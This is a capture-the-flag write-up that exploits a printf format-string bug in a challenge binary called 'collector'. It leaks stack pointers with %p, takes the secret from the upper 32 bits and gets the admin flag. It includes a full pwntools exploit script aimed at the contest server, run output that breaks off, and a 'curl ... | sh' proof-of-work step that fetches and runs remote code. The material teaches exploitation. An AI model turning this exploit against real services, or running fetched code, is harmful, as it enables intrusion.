+<p>The KRAMPUS Syndicate left an "exfiltration endpoint" on the victim's machine. This endpoint received the stolen data and then sent it back to their server.</p>
+<p>The researcher found a copy of the server binary (<code>collector</code>). From that binary, we had to find the bug and how to read the stolen secret. The remote system uses <strong>Proof-of-Work</strong> to prevent brute force attacks.</p>
+<hr>
+<h1 id="local-analysis-binary-inspection">Local Analysis - Binary Inspection<a class="headerlink" href="#local-analysis-binary-inspection" title="Permanent link">¶</a></h1>
+<p>We found the file:</p>
+<div class="highlight"><pre><span></span><code>collector: ELF 64-bit, x86-64, dynamically linked, no PIE
+</code></pre></div>
+<p>Checksec:</p>
+<div class="highlight"><pre><span></span><code>Partial RELRO
+No stack canary
+NX enabled
+No PIE
+</code></pre></div>
+<p>No ASLR at the executable offset, but the remote server has normal ASLR.</p>
+<hr>
+<h2 id="strings-architecture">Strings &amp; Architecture<a class="headerlink" href="#strings-architecture" title="Permanent link">¶</a></h2>
+<p>When executed locally:</p>
+<div class="highlight"><pre><span></span><code>./collector
+If you see this on remote, contact admin
+</code></pre></div>
+<p>The program does not reveal behavior. Need to reverse.</p>
+<hr>
+<h1 id="reverse-engineering-ghidra">Reverse Engineering (Ghidra)<a class="headerlink" href="#reverse-engineering-ghidra" title="Permanent link">¶</a></h1>
+<p>Important functions:</p>
+<h2 id="handle_write-vulnerability"><code>handle_write</code> Vulnerability<a class="headerlink" href="#handle_write-vulnerability" title="Permanent link">¶</a></h2>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">handle_write</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"data: "</span><span class="p">);</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">collected_data</span><span class="p">,</span><span class="w"> </span><span class="mh">0x400</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"ok"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Writes user input to the global <code>collected_data</code> buffer.</p>
+<hr>
+<h2 id="handle_read-format-string-bug"><code>handle_read</code> Format String Bug<a class="headerlink" href="#handle_read-format-string-bug" title="Permanent link">¶</a></h2>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">handle_read</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"data:"</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">collected_data</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>❗ <strong>BUG</strong>: <code>printf(collected_data)</code> without a format specifier → FORMAT STRING VULNERABILITY.</p>
+<p>This means that if <code>collected_data</code> contains <code>%p %p %p ...</code>, printf will read the value from the stack and print the pointer/word there.</p>
+<p>This allows an arbitrary read of the data on the stack.</p>
+<hr>
+<h2 id="handle_admin-secret-check"><code>handle_admin</code> Secret Check<a class="headerlink" href="#handle_admin-secret-check" title="Permanent link">¶</a></h2>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">handle_admin</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">param_1</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="kt">char</span><span class="w"> </span><span class="n">local_buf</span><span class="p">[</span><span class="mh">0x118</span><span class="p">];</span>
+<span class="n">fgets</span><span class="p">(</span><span class="n">local_buf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x100</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="n">local_c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strtoul</span><span class="p">(</span><span class="n">local_buf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="n">local_c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">param_1</span><span class="p">){</span>
+<span class="n">puts</span><span class="p">(</span><span class="n">metadata</span><span class="p">);</span>
+<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"denied"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>The parameter <code>param_1</code> is <strong>32-bit secret</strong>. If we enter the value true → server print <code>metadata</code>, which contains flags.</p>
+<hr>
+<h1 id="exploit-flow">Exploit Flow<a class="headerlink" href="#exploit-flow" title="Permanent link">¶</a></h1>
+<h3 id="program-workflow">Program Workflow<a class="headerlink" href="#program-workflow" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code>cmd:
+write → user sends payload → saved into collected_data
+read → print collected_data using printf(collected_data)
+admin → user enters 32-bit secret number
+</code></pre></div>
+<p>So we do:</p>
+<ol>
+<li><code>write</code> → <code>%p %p %p %p %p ...</code></li>
+<li><code>read</code> → leak multiple pointers</li>
+<li>Analyze one of the pointers that contains the secret</li>
+<li><code>admin</code> → send secret → flag exit</li>
+</ol>
+<hr>
+<h1 id="real-challenge-extracting-the-secret">Real Challenge: Extracting the Secret<a class="headerlink" href="#real-challenge-extracting-the-secret" title="Permanent link">¶</a></h1>
+<p>Hint from the organizer:</p>
+<blockquote>
+<p>You've leaked a 64-bit stack value, but the secret is only 32-bit. Think about how 64-bit memory layout works. The upper 4 bytes of the pointer already contain the secret you're looking for.
+</p>
+</blockquote>
+<p><strong>This is the primary key</strong>.</p>
+<hr>
+<h2 id="memory-layout-explanation-very-important">Memory Layout Explanation (Very Important)<a class="headerlink" href="#memory-layout-explanation-very-important" title="Permanent link">¶</a></h2>
+<p>x86-64 (little-endian)** architecture:</p>
+<h3 id="64-bit-pointer-memory-layout">64-bit pointer → memory layout:<a class="headerlink" href="#64-bit-pointer-memory-layout" title="Permanent link">¶</a></h3>
+<p>Memory (low → high):</p>
+<div class="highlight"><pre><span></span><code>[ lower 4 bytes ][ upper 4 bytes ]
+</code></pre></div>
+<ul>
+<li>print <code>%p</code> → display in <strong>big-endian hex string</strong> format</li>
+</ul>
+<p>example: pointer in RAM:</p>
+<div class="highlight"><pre><span></span><code>E8 79 DD D5 52 2E 0F 50
+</code></pre></div>
+<p>Displayed as:</p>
+<div class="highlight"><pre><span></span><code>0x500f2e52d5dd79e8
+</code></pre></div>
+<p>Separate four bytes:</p>
+<div class="highlight"><pre><span></span><code>upper 4 bytes: 0x500f2e52
+lower 4 bytes: 0xd5dd79e8
+</code></pre></div>
+<p>Secret = <strong>upper 4 bytes interpreted as unsigned int</strong></p>
+<p>Because:</p>
+<ul>
+<li>secret is used as a <strong>int (32-bit)</strong>, and <strong>stored on the stack</strong>,</li>
+<li>when the stack is used and the pointer is printed, the secret "goes" to the register/stack frame near the pointer we printed,</li>
+<li>so that number can appear as part of a pointer leak.</li>
+</ul>
+<hr>
+<h2 id="why-upper-not-lower">Why upper, not lower?<a class="headerlink" href="#why-upper-not-lower" title="Permanent link">¶</a></h2>
+<p>Stack memory overlapping:</p>
+<div class="highlight"><pre><span></span><code>+-------------------+
+| return addr |
+| saved rbp |
+| local variables |
+| .... |
+| int secret (4B) |
+| padding (4B) |
++-------------------+
+</code></pre></div>
+<p>When <code>%p</code> reads 8 bytes from a position on the stack:</p>
+<div class="highlight"><pre><span></span><code>[ secret 4B ][ padding/some data 4B ]
+</code></pre></div>
+<p>The printed 8 bytes are interpreted as a pointer, but the first 4 bytes are actually the secret.</p>
+<p>And this still appears even if the server uses ASLR.</p>
+<hr>
+<h1 id="live-exploitation-using-automation">Live Exploitation Using Automation<a class="headerlink" href="#live-exploitation-using-automation" title="Permanent link">¶</a></h1>
+<h3 id="step-1-connect">Step 1: Connect<a class="headerlink" href="#step-1-connect" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code>nc ctf.csd.lol 7777
+</code></pre></div>
+<p>Server gives PoW:</p>
+<div class="highlight"><pre><span></span><code>Proof of work:
+curl -sSfL &lt;https://pwn.red/pow&gt; | sh -s &lt;challenge&gt;
+</code></pre></div>
+<p>Solver gives <code>solution:</code> → we send it back.</p>
+<hr>
+<h3 id="step-2-leak-string-format">Step 2: Leak String Format<a class="headerlink" href="#step-2-leak-string-format" title="Permanent link">¶</a></h3>
+<p>Command sequence:</p>
+<div class="highlight"><pre><span></span><code>cmd: write
+data: %p %p %p %p %p %p %p %p %p %p %p
+OK
+cmd: read
+data:
+0x7f81d332f643 (nil) ...
+</code></pre></div>
+<p>Real run output that finds the flag:</p>
+<div class="highlight"><pre><span></span><code>0x500f2e52d5dd79e8
+</code></pre></div>
+<p>Now separate:</p>
+<div class="highlight"><pre><span></span><code>upper 32-bit = 0x500f2e52 → 1343172178 decimal
+lower 32-bit = 0xd5dd79e8 → 3588061672 decimal
+</code></pre></div>
+<p>Test into <code>admin:</code>:</p>
+<div class="highlight"><pre><span></span><code>cmd: admin
+auth: 1343172178
+</code></pre></div>
+<p>Server returns:</p>
+<div class="highlight"><pre><span></span><code># KRAMPUS SYNDICATE EXFIL v1.4
+...
+rotation_tag: csd{Kr4mpUS_n33Ds_70_l34RN_70_Ch3Ck_c0Mp1l3R_W4RN1N92}
+</code></pre></div>
+<p>exploit script</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kr">from</span><span class="w"> </span><span class="nx">pwn</span><span class="w"> </span><span class="k">import</span><span class="w"> </span><span class="o">*</span>
+<span class="k">import</span><span class="w"> </span><span class="nx">subprocess</span>
+<span class="k">import</span><span class="w"> </span><span class="nx">re</span>
+
+<span class="nx">HOST</span><span class="p">,</span><span class="w"> </span><span class="nx">PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"ctf.csd.lol"</span><span class="p">,</span><span class="w"> </span><span class="mf">7777</span>
+<span class="nx">context</span><span class="p">.</span><span class="nx">log_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"info"</span>
+
+<span class="nx">def</span><span class="w"> </span><span class="nx">solve_pow</span><span class="p">(</span><span class="nx">pow_cmd</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">str</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">log</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">f</span><span class="s2">"Running PoW: {pow_cmd}"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="nx">pow_cmd</span><span class="p">,</span><span class="w"> </span><span class="nx">shell</span><span class="o">=</span><span class="nx">True</span><span class="p">,</span><span class="w"> </span><span class="nx">capture_output</span><span class="o">=</span><span class="nx">True</span><span class="p">,</span><span class="w"> </span><span class="nx">text</span><span class="o">=</span><span class="nx">True</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">strip</span><span class="p">()</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">line</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">out</span><span class="p">.</span><span class="nx">splitlines</span><span class="p">()</span><span class="o">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">line</span><span class="p">.</span><span class="nx">startswith</span><span class="p">(</span><span class="s2">"solution:"</span><span class="p">)</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">sol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">line</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)[</span><span class="mf">1</span><span class="p">].</span><span class="nx">strip</span><span class="p">()</span>
+<span class="w">            </span><span class="nx">log</span><span class="p">.</span><span class="nx">success</span><span class="p">(</span><span class="nx">f</span><span class="s2">"PoW solution: {sol}"</span><span class="p">)</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">sol</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Fallback</span><span class="o">:</span><span class="w"> </span><span class="nx">entire</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">solution</span>
+<span class="w">    </span><span class="nx">log</span><span class="p">.</span><span class="nx">success</span><span class="p">(</span><span class="nx">f</span><span class="s2">"PoW solution (fallback): {out}"</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">out</span>
+
+<span class="nx">def</span><span class="w"> </span><span class="nx">split_upper_lower</span><span class="p">(</span><span class="nx">ptr</span><span class="o">:</span><span class="w"> </span><span class="nx">str</span><span class="p">)</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ptr</span><span class="p">[</span><span class="mf">2</span><span class="o">:</span><span class="p">].</span><span class="nx">rjust</span><span class="p">(</span><span class="mf">16</span><span class="p">,</span><span class="w"> </span><span class="s2">"0"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">upper_hex</span><span class="p">,</span><span class="w"> </span><span class="nx">lower_hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">h</span><span class="p">[</span><span class="o">:</span><span class="mf">8</span><span class="p">],</span><span class="w"> </span><span class="nx">h</span><span class="p">[</span><span class="mf">8</span><span class="o">:</span><span class="p">]</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">h</span><span class="p">,</span><span class="w"> </span><span class="nx">upper_hex</span><span class="p">,</span><span class="w"> </span><span class="kr">int</span><span class="p">(</span><span class="nx">upper_hex</span><span class="p">,</span><span class="w"> </span><span class="mf">16</span><span class="p">),</span><span class="w"> </span><span class="nx">lower_hex</span><span class="p">,</span><span class="w"> </span><span class="kr">int</span><span class="p">(</span><span class="nx">lower_hex</span><span class="p">,</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span>
+
+<span class="nx">def</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">remote</span><span class="p">(</span><span class="nx">HOST</span><span class="p">,</span><span class="w"> </span><span class="nx">PORT</span><span class="p">)</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Proof</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">Work</span><span class="w"> </span><span class="o">---</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"proof of work:\n"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">pow_cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvline</span><span class="p">().</span><span class="nx">decode</span><span class="p">().</span><span class="nx">strip</span><span class="p">()</span>
+<span class="w">    </span><span class="nx">log</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">f</span><span class="s2">"PoW cmd: {pow_cmd}"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"solution:"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">sol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">solve_pow</span><span class="p">(</span><span class="nx">pow_cmd</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">sol</span><span class="p">.</span><span class="nx">encode</span><span class="p">())</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"cmd:"</span><span class="p">)</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Leak</span><span class="w"> </span><span class="nx">pointers</span><span class="w"> </span><span class="o">---</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">b</span><span class="s2">"write"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"data:"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">b</span><span class="s2">"%p "</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">16</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"ok"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"cmd:"</span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">b</span><span class="s2">"read"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"cmd:"</span><span class="p">).</span><span class="nx">decode</span><span class="p">(</span><span class="nx">errors</span><span class="o">=</span><span class="s2">"ignore"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">leak_line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">next</span><span class="p">((</span><span class="nx">line</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">line</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">out</span><span class="p">.</span><span class="nx">splitlines</span><span class="p">()</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="s2">"0x"</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">line</span><span class="p">),</span><span class="w"> </span><span class="nx">None</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">leak_line</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"No leak found"</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span>
+
+<span class="w">    </span><span class="nx">ptrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">re</span><span class="p">.</span><span class="nx">findall</span><span class="p">(</span><span class="nx">r</span><span class="s2">"0x[0-9a-fA-F]+"</span><span class="p">,</span><span class="w"> </span><span class="nx">leak_line</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">ptrs</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">"No pointers parsed"</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span>
+
+<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="s2">"\n[+] Leaked pointers:"</span><span class="p">)</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">enumerate</span><span class="p">(</span><span class="nx">ptrs</span><span class="p">)</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">" idx {i}: {p}"</span><span class="p">)</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Build</span><span class="w"> </span><span class="nx">candidates</span><span class="w"> </span><span class="o">---</span>
+<span class="w">    </span><span class="nx">candidates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="s2">"\n[+] Derived candidates:"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="s2">"idx | pointer          | upper_hex | upper_dec | lower_hex | lower_dec"</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">print</span><span class="p">(</span><span class="s2">"----+------------------+-----------+-----------+-----------+----------"</span><span class="p">)</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">idx</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">enumerate</span><span class="p">(</span><span class="nx">ptrs</span><span class="p">)</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">full_h</span><span class="p">,</span><span class="w"> </span><span class="nx">up_h</span><span class="p">,</span><span class="w"> </span><span class="nx">up_d</span><span class="p">,</span><span class="w"> </span><span class="nx">lo_h</span><span class="p">,</span><span class="w"> </span><span class="nx">lo_d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split_upper_lower</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"{idx:3} | {p:16} | {up_h:9} | {up_d:9} | {lo_h:9} | {lo_d:9}"</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">candidates</span><span class="p">.</span><span class="nx">append</span><span class="p">((</span><span class="nx">f</span><span class="s2">"idx{idx}-upper({up_h})"</span><span class="p">,</span><span class="w"> </span><span class="nx">up_d</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">candidates</span><span class="p">.</span><span class="nx">append</span><span class="p">((</span><span class="nx">f</span><span class="s2">"idx{idx}-lower({lo_h})"</span><span class="p">,</span><span class="w"> </span><span class="nx">lo_d</span><span class="p">))</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Try</span><span class="w"> </span><span class="nx">candidates</span><span class="w"> </span><span class="o">---</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">desc</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">candidates</span><span class="o">:</span>
+<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">f</span><span class="s2">"Trying {desc} = {val}"</span><span class="p">)</span>
+<span class="w">        </span><span class="k">try</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">b</span><span class="s2">"admin"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"auth:"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">r</span><span class="p">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">str</span><span class="p">(</span><span class="nx">val</span><span class="p">).</span><span class="nx">encode</span><span class="p">())</span>
+<span class="w">            </span><span class="nx">resp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="nx">b</span><span class="s2">"cmd:"</span><span class="p">,</span><span class="w"> </span><span class="nx">timeout</span><span class="o">=</span><span class="mf">3</span><span class="p">).</span><span class="nx">decode</span><span class="p">(</span><span class="nx">errors</span><span class="o">=</span><span class="s2">"ignore"</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">except</span><span class="w"> </span><span class="nx">EOFError</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">log</span><span class="p">.</span><span class="nx">warning</span><span class="p">(</span><span class="s2">"Connection closed during attempt"</span><span class="p">)</span>
+<span class="w">            </span><span class="k">break</span>
+
+<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">f</span><span class="s2">"Response for {desc}:\n{resp}"</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="s2">"denied"</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">resp</span><span class="p">.</span><span class="nx">lower</span><span class="p">()</span><span class="o">:</span>
+<span class="w">            </span><span class="nx">print</span><span class="p">(</span><span class="s2">"\n====== SUCCESS? ======"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"Candidate: {desc}"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s2">"Value    : {val}"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">print</span><span class="p">(</span><span class="s2">"Full response:"</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">print</span><span class="p">(</span><span class="nx">resp</span><span class="p">)</span>
+<span class="w">            </span><span class="k">break</span>
+
+<span class="w">    </span><span class="nx">r</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+
+<span class="k">if</span><span class="w"> </span><span class="nx">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"__main__"</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">main</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="nx">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="err">/Downloads/cyberstudent]</span>
+<span class="err">└─</span><span class="nx">$</span><span class="w"> </span><span class="nx">python3</span><span class="w"> </span><span class="nx">failed</span><span class="o">-</span><span class="nx">exfil</span><span class="p">.</span><span class="nx">py</span><span class="w"> </span>
+
+<span class="p">[</span><span class="err">◢</span><span class="p">]</span><span class="w"> </span><span class="nx">Opening</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ctf</span><span class="p">.</span><span class="nx">csd</span><span class="p">.</span><span class="nx">lol</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mf">7777</span><span class="o">:</span><span class="w"> </span><span class="nx">Trying</span><span class="w"> </span><span class="mf">52.204.1</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Opening</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">ctf</span><span class="p">.</span><span class="nx">csd</span><span class="p">.</span><span class="nx">lol</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="mf">7777</span><span class="o">:</span><span class="w"> </span><span class="nx">Done</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">PoW</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nx">line</span><span class="o">:</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="o">-</span><span class="nx">sSfL</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Running</span><span class="w"> </span><span class="nx">PoW</span><span class="o">:</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="o">-</span><span class="nx">sSfL</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//pwn.red/pow | sh -s s.AAAAAw==.NmJZCB7S1zEu0cX+ZmCUuw==</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">PoW</span><span class="w"> </span><span class="nx">solution</span><span class="w"> </span><span class="p">(</span><span class="nx">fallback</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">YJfar2Mrb6wM0YjbNvjmYDmH36zdVzQaWhOIr2LsGwLNUqtCvG3GeY3sP</span><span class="o">/</span><span class="mf">8</span><span class="o">/</span><span class="nx">dSB6DEvJwVg1in1wyU1LfwxU2hFedoe799nGs9TQwx06vsK9s9UnSzYANXwOARTPkOmPrZ9IJl5Pv13Nlb2UmELfPnN3jS5dxjXjXsiIWFeHC6IrjaS6kOsyKo6JCXY38fzKNcLijRGAm2rUu9lvcFRHyA</span><span class="o">==</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nx">Raw</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">output</span><span class="o">:</span>
+<span class="w">     </span><span class="nx">data</span><span class="o">:</span>
